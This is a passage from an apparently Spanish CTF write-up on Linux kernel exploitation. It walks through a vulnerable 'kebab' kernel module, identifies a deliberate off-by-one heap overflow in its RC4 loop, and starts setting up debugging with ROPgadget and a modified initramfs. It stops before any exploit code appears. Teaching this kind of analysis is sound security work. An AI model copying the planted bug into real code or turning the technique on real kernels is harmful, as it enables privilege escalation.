+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">copy_to_user</span><span class="mtk1">(argp, </span><span class="mtk5">&amp;</span><span class="mtk1">info</span><span class="mtk1">, </span><span class="mtk5">sizeof</span><span class="mtk1">(</span><span class="mtk1">info</span><span class="mtk1">))) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EFAULT;</span>
+
+<span class="mtk1">  </span><span class="mtk8">printk</span><span class="mtk1">(KERN_INFO </span><span class="mtk4">"kebab: key setted</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
+
+<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Esta función copia la clave de RC4 que le pasamos al kernel en una variable global. Además, la función nos devuelve una estructura con el identificador del proceso (PID) y un puntero a la variable <code>current</code>.</p><h3 id="función-de-asignación">Función de asignación</h3><p>Otra opción que ofrece el módulo es escribir en un <em>buffer</em> y que cifrar la información con RC4 y la clave anterior:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">ioctl_new</span><span class="mtk1">(</span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk9 mtki">__user</span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk9 mtki">argp</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">struct</span><span class="mtk1"> </span><span class="mtk8 mtku">new_secbuff_arg</span><span class="mtk1"> </span><span class="mtk1">arg_struct</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">copy_from_user</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">arg_struct</span><span class="mtk1">, argp, </span><span class="mtk5">sizeof</span><span class="mtk1">(</span><span class="mtk1">arg_struct</span><span class="mtk1">))) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EFAULT;</span>  
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk8">is_the_same_key</span><span class="mtk1">(</span><span class="mtk1">arg_struct</span><span class="mtk1">.</span><span class="mtk1">key</span><span class="mtk1">)) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EINVAL;</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">arg_struct</span><span class="mtk1">.</span><span class="mtk1">size</span><span class="mtk1"> </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk8">KEBAB_MAX_BUFFER_SIZE</span><span class="mtk1">) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EFAULT;</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">n_buffs</span><span class="mtk1"> </span><span class="mtk5">&gt;=</span><span class="mtk1"> </span><span class="mtk8">KEBAB_MAX_BUFFERS</span><span class="mtk1">) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">ENOMEM;</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">alloc_secure_buff</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">arg_struct</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EINVAL) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EINVAL;</span>
+
+<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">init_secure_buff</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">arg_struct</span><span class="mtk1">);</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Para esta función, tenemos que usar una estructura <code>new_secbuff_arg</code>, que contiene el tamaño del <em>chunk</em> que queremos crear (<code>size</code>), los datos (<code>buffer</code>) y la clave de cifrado RC4 (<code>key</code>). Además, se verifica que esta clave sea la misma que la que pusimos en la función <code>ioctl_set_key</code>. La verificación utiliza <code>strncmp</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">is_the_same_key</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk9 mtki">key</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk8">strncmp</span><span class="mtk1">(</span><span class="mtk9 mtki">key</span><span class="mtk1">, </span><span class="mtk1">RC4_key</span><span class="mtk1">, </span><span class="mtk8">MAX_RC4_LEN</span><span class="mtk1">);</span>  
+<span class="mtk1">}</span>
+</code></pre></div><p>Luego, se comprueba que el tamaño del <em>chunk</em> no exceda de 2048 (<code>KEBAB_MAX_BUFFER_SIZE</code>) y que haya menos de 4 <em>buffers</em> asignados (<code>KEBAB_MAX_BUFFERS</code>).</p><p>Si todo esto se cumple, se ejecuta <code>alloc_secure_buff</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">alloc_secure_buff</span><span class="mtk1">(</span><span class="mtk7 mtki">struct</span><span class="mtk1"> </span><span class="mtk8 mtku">new_secbuff_arg</span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk9 mtki">arg_struct</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk1">sec_buffs</span><span class="mtk1">[</span><span class="mtk1">n_buffs</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">kmalloc</span><span class="mtk1">(</span><span class="mtk5">sizeof</span><span class="mtk1">(</span><span class="mtk7 mtki">struct</span><span class="mtk1"> </span><span class="mtk8 mtku">secure_buffer</span><span class="mtk1">), GFP_KERNEL);</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">sec_buffs</span><span class="mtk1">[</span><span class="mtk1">n_buffs</span><span class="mtk1">]) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EINVAL;</span>
+
+<span class="mtk1">  </span><span class="mtk1">sec_buffs</span><span class="mtk1">[</span><span class="mtk1">n_buffs</span><span class="mtk1">]-&gt;</span><span class="mtk1">buffer</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">kzalloc</span><span class="mtk1">(</span><span class="mtk9 mtki">arg_struct</span><span class="mtk1">-&gt;</span><span class="mtk1">size</span><span class="mtk1">, GFP_KERNEL);</span>  
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">sec_buffs</span><span class="mtk1">[</span><span class="mtk1">n_buffs</span><span class="mtk1">]-&gt;</span><span class="mtk1">buffer</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">kfree</span><span class="mtk1">(</span><span class="mtk1">sec_buffs</span><span class="mtk1">[</span><span class="mtk1">n_buffs</span><span class="mtk1">]);</span>
+<span class="mtk1">    </span><span class="mtk1">sec_buffs</span><span class="mtk1">[</span><span class="mtk1">n_buffs</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EINVAL;</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk1">sec_buffs</span><span class="mtk1">[</span><span class="mtk1">n_buffs</span><span class="mtk1">]-&gt;</span><span class="mtk1">size</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">arg_struct</span><span class="mtk1">-&gt;</span><span class="mtk1">size</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk8">printk</span><span class="mtk1">(KERN_INFO </span><span class="mtk4">"kebab: created </span><span class="mtk6">%d\n</span><span class="mtk4">"</span><span class="mtk1">, n_buffs);</span>
+<span class="mtk1">  </span><span class="mtk1">n_buffs</span><span class="mtk5">++</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>En esta función se crea un <em>chunk</em> para alojar una estructura <code>secure_buffer</code>, y se guarda en el <em>array</em> global <code>sec_buffs</code>. En el campo <code>buffer</code> de la estructura <code>secure_buffer</code> se asigna un <em>chunk</em> con <code>kmalloc</code> y el tamaño indicado en la estructura <code>new_secbuff_arg</code> anterior. Este tamaño también se copia en la estructura <code>secure_buffer</code>.</p><p>Acto seguido, se llama a <code>init_secure_buffer</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">init_secure_buff</span><span class="mtk1">(</span><span class="mtk7 mtki">struct</span><span class="mtk1"> </span><span class="mtk8 mtku">new_secbuff_arg</span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk9 mtki">arg_struct</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">u_buffer</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk1">u_buffer</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">kzalloc</span><span class="mtk1">(</span><span class="mtk8">KEBAB_MAX_BUFFER_SIZE</span><span class="mtk1">, GFP_KERNEL);</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">u_buffer</span><span class="mtk1">) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EINVAL;</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">copy_from_user</span><span class="mtk1">(</span><span class="mtk1">u_buffer</span><span class="mtk1">, </span><span class="mtk9 mtki">arg_struct</span><span class="mtk1">-&gt;</span><span class="mtk1">buffer</span><span class="mtk1">, </span><span class="mtk9 mtki">arg_struct</span><span class="mtk1">-&gt;</span><span class="mtk1">size</span><span class="mtk1">)) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EFAULT;</span>  
+
+<span class="mtk1">  </span><span class="mtk8">RC4</span><span class="mtk1">(</span><span class="mtk1">u_buffer</span><span class="mtk1">, </span><span class="mtk1">sec_buffs</span><span class="mtk1">[</span><span class="mtk1">n_buffs</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">]-&gt;</span><span class="mtk1">buffer</span><span class="mtk1">, </span><span class="mtk9 mtki">arg_struct</span><span class="mtk1">-&gt;</span><span class="mtk1">size</span><span class="mtk1">);</span>
+
+<span class="mtk1">  </span><span class="mtk8">kfree</span><span class="mtk1">(</span><span class="mtk1">u_buffer</span><span class="mtk1">);</span>
+
+<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>En esta función se copian los datos del usuario en un <em>chunk</em> lo suficientemente grande (2 kiB), se cifra con RC4 y se libera el <em>chunk</em>.</p><h3 id="cifrado-rc4">Cifrado RC4</h3><p>Las funciones que realizan el cifrado RC4 son las siguientes:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">static</span><span class="mtk1"> __inline </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">swap_bytes</span><span class="mtk1">(</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk9 mtki">a</span><span class="mtk1">, </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk9 mtki">b</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk1">temp</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk1">temp</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">a</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk5">*</span><span class="mtk9 mtki">a</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">b</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk5">*</span><span class="mtk9 mtki">b</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">temp</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">rc4_init</span><span class="mtk1">(</span><span class="mtk5">const</span><span class="mtk1"> </span><span class="mtk7 mtki">struct</span><span class="mtk1"> </span><span class="mtk8 mtku">rc4_state</span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk9 mtki">state</span><span class="mtk1">, </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk9 mtki">key</span><span class="mtk1">, </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">keylen</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk1">j</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk5">for</span><span class="mtk1"> (</span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">256</span><span class="mtk1">; </span><span class="mtk1">i</span><span class="mtk5">++</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">state</span><span class="mtk1">-&gt;</span><span class="mtk1">perm</span><span class="mtk1">[</span><span class="mtk1">i</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk1">) </span><span class="mtk1">i</span><span class="mtk1">; </span>
+<span class="mtk1">  } </span>
+
+<span class="mtk1">  </span><span class="mtk9 mtki">state</span><span class="mtk1">-&gt;</span><span class="mtk1">index1</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk9 mtki">state</span><span class="mtk1">-&gt;</span><span class="mtk1">index2</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk5">for</span><span class="mtk1"> (</span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">j</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">256</span><span class="mtk1">; </span><span class="mtk1">i</span><span class="mtk5">++</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk1">j</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk9 mtki">state</span><span class="mtk1">-&gt;</span><span class="mtk1">perm</span><span class="mtk1">[</span><span class="mtk1">i</span><span class="mtk1">] </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk9 mtki">key</span><span class="mtk1">[</span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">%</span><span class="mtk1"> </span><span class="mtk9 mtki">keylen</span><span class="mtk1">]; </span>
+<span class="mtk1">    </span><span class="mtk8">swap_bytes</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk9 mtki">state</span><span class="mtk1">-&gt;</span><span class="mtk1">perm</span><span class="mtk1">[</span><span class="mtk1">i</span><span class="mtk1">], </span><span class="mtk5">&amp;</span><span class="mtk9 mtki">state</span><span class="mtk1">-&gt;</span><span class="mtk1">perm</span><span class="mtk1">[</span><span class="mtk1">j</span><span class="mtk1">]);</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">rc4_crypt</span><span class="mtk1">(</span><span class="mtk5">const</span><span class="mtk1"> </span><span class="mtk7 mtki">struct</span><span class="mtk1"> </span><span class="mtk8 mtku">rc4_state</span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">const</span><span class="mtk1"> </span><span class="mtk9 mtki">state</span><span class="mtk1">, </span><span class="mtk5">const</span><span class="mtk1"> </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk9 mtki">inbuf</span><span class="mtk1">, </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk9 mtki">outbuf</span><span class="mtk1">, </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">buflen</span><span class="mtk1">) {</span>  
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk1">j</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk5">for</span><span class="mtk1"> (</span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">&lt;=</span><span class="mtk1"> </span><span class="mtk9 mtki">buflen</span><span class="mtk1">; </span><span class="mtk1">i</span><span class="mtk5">++</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">state</span><span class="mtk1">-&gt;</span><span class="mtk1">index1</span><span class="mtk5">++</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">state</span><span class="mtk1">-&gt;</span><span class="mtk1">index2</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk9 mtki">state</span><span class="mtk1">-&gt;</span><span class="mtk1">perm</span><span class="mtk1">[</span><span class="mtk9 mtki">state</span><span class="mtk1">-&gt;</span><span class="mtk1">index1</span><span class="mtk1">];</span>
+
+<span class="mtk1">    </span><span class="mtk8">swap_bytes</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk9 mtki">state</span><span class="mtk1">-&gt;</span><span class="mtk1">perm</span><span class="mtk1">[</span><span class="mtk9 mtki">state</span><span class="mtk1">-&gt;</span><span class="mtk1">index1</span><span class="mtk1">], </span><span class="mtk5">&amp;</span><span class="mtk9 mtki">state</span><span class="mtk1">-&gt;</span><span class="mtk1">perm</span><span class="mtk1">[</span><span class="mtk9 mtki">state</span><span class="mtk1">-&gt;</span><span class="mtk1">index2</span><span class="mtk1">]);</span>
+
+<span class="mtk1">    </span><span class="mtk1">j</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">state</span><span class="mtk1">-&gt;</span><span class="mtk1">perm</span><span class="mtk1">[</span><span class="mtk9 mtki">state</span><span class="mtk1">-&gt;</span><span class="mtk1">index1</span><span class="mtk1">] </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk9 mtki">state</span><span class="mtk1">-&gt;</span><span class="mtk1">perm</span><span class="mtk1">[</span><span class="mtk9 mtki">state</span><span class="mtk1">-&gt;</span><span class="mtk1">index2</span><span class="mtk1">];</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">outbuf</span><span class="mtk1">[</span><span class="mtk1">i</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">inbuf</span><span class="mtk1">[</span><span class="mtk1">i</span><span class="mtk1">] </span><span class="mtk5">^</span><span class="mtk1"> </span><span class="mtk9 mtki">state</span><span class="mtk1">-&gt;</span><span class="mtk1">perm</span><span class="mtk1">[</span><span class="mtk1">j</span><span class="mtk1">];</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">RC4</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk9 mtki">user_buff</span><span class="mtk1">, </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk9 mtki">sec_buff</span><span class="mtk1">, </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> </span><span class="mtk9 mtki">size</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">struct</span><span class="mtk1"> </span><span class="mtk8 mtku">rc4_state</span><span class="mtk1"> </span><span class="mtk1">rc4st</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk8">rc4_init</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">rc4st</span><span class="mtk1">, </span><span class="mtk1">RC4_key</span><span class="mtk1">, </span><span class="mtk8">strlen</span><span class="mtk1">(</span><span class="mtk1">RC4_key</span><span class="mtk1">));</span>
+<span class="mtk1">  </span><span class="mtk8">rc4_crypt</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">rc4st</span><span class="mtk1">, </span><span class="mtk9 mtki">user_buff</span><span class="mtk1">, </span><span class="mtk9 mtki">sec_buff</span><span class="mtk1">, </span><span class="mtk9 mtki">size</span><span class="mtk1">);</span>
+
+<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>RC4 es un cifrador en flujo, por lo que la clave de cifrado lo que genera es un <em>keystream</em> (que se podría considerar como aleatorio). Y para cifrar, se realiza la operación XOR entre los bytes de texto claro y los bytes del <em>keystream</em>.</p><p>La vulnerabilidad del módulo se encuentra en la función <code>rc4_crypt</code>. El fallo está en la condición del bucle <code>for</code>, que admite un índice más de lo debido: <code>for (i = 0; i &lt;= buflen; i++) {</code>. Con esto podemos conseguir un desbordamiento de un byte en el <em>heap</em> (conocido como <em>off-by-one</em>). Por ejemplo, si definimos un <em>chunk</em> de 256 bytes, realmente podremos escribir un byte más allá de este <em>chunk</em>.</p><h3 id="función-de-lectura">Función de lectura</h3><p>Solo por terminar el análisis, esta es la otra opción que nos da el módulo:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">ioctl_read</span><span class="mtk1">(</span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk9 mtki">__user</span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk9 mtki">argp</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">struct</span><span class="mtk1"> </span><span class="mtk8 mtku">read_secbuff_arg</span><span class="mtk1"> </span><span class="mtk1">arg_struct</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">copy_from_user</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">arg_struct</span><span class="mtk1">, argp, </span><span class="mtk5">sizeof</span><span class="mtk1"> </span><span class="mtk1">arg_struct</span><span class="mtk1">)) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EFAULT;</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk8">is_the_same_key</span><span class="mtk1">(</span><span class="mtk1">arg_struct</span><span class="mtk1">.</span><span class="mtk1">key</span><span class="mtk1">)) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EINVAL;</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">arg_struct</span><span class="mtk1">.</span><span class="mtk1">index</span><span class="mtk1"> </span><span class="mtk5">&gt;=</span><span class="mtk1"> </span><span class="mtk1">n_buffs</span><span class="mtk1">) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EINVAL;</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">copy_to_user</span><span class="mtk1">(</span><span class="mtk1">arg_struct</span><span class="mtk1">.</span><span class="mtk1">buffer</span><span class="mtk1">, </span><span class="mtk1">sec_buffs</span><span class="mtk1">[</span><span class="mtk1">arg_struct</span><span class="mtk1">.</span><span class="mtk1">index</span><span class="mtk1">]-&gt;</span><span class="mtk1">buffer</span><span class="mtk1">, </span><span class="mtk1">sec_buffs</span><span class="mtk1">[</span><span class="mtk1">arg_struct</span><span class="mtk1">.</span><span class="mtk1">index</span><span class="mtk1">]-&gt;</span><span class="mtk1">size</span><span class="mtk1">)) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">EFAULT;</span>  
+
+<span class="mtk1">  </span><span class="mtk8">printk</span><span class="mtk1">(KERN_INFO </span><span class="mtk4">"kebab: read </span><span class="mtk6">%zu</span><span class="mtk4"> bytes from </span><span class="mtk6">%lu\n</span><span class="mtk4">"</span><span class="mtk1">, sec_buffs[arg_struct.index]-&gt;size, arg_struct.in</span><span class="mtk1">dex);</span>
+
+<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Esta función no es de gran utilidad porque lo que nos permite es leer el contenido de los <em>chunks</em> ya asignados (obtendríamos el contenido cifrado). Entonces, es algo que podemos conocer sin necesidad de usar el módulo, ya que tenemos la clave de cifrado RC4 y la información de los <em>chunks</em> asignados en texto claro.</p><h2 id="configuración-del-entorno">Configuración del entorno</h2><p>Antes de comenzar a escribir el <em>exploit</em> es necesario configurar el entorno. Para ello, me baso en la guía de <a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/">lkmidas.github.io</a>. En primer lugar, extraemos el kernel y obtenemos los <em>gadgets</em> de ROP por si fuera necesario para más adelante:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">wget</span> -q https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/extract-image.sh  
+
+<span class="code-red">#</span> <span class="code-dark-green">sh</span> <span class="mtku">extract-image.sh</span> <span class="mtku">vmlinuz-4.19.306</span> &gt; vmlinux
+
+<span class="code-red">#</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">vmlinux</span> &gt; rop.txt
+</code></pre></div><p>Lo siguiente que podemos hacer es extraer y modificar el sistema de archivos para acceder como <code>root</code> cuando lancemos el kernel con <code>qemu</code> y así poder depurar mejor:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">mkdir</span> initramfs
+
+<span class="code-red">#</span> <span class="code-dark-green">cd</span> <span class="mtku">initramfs</span>
+
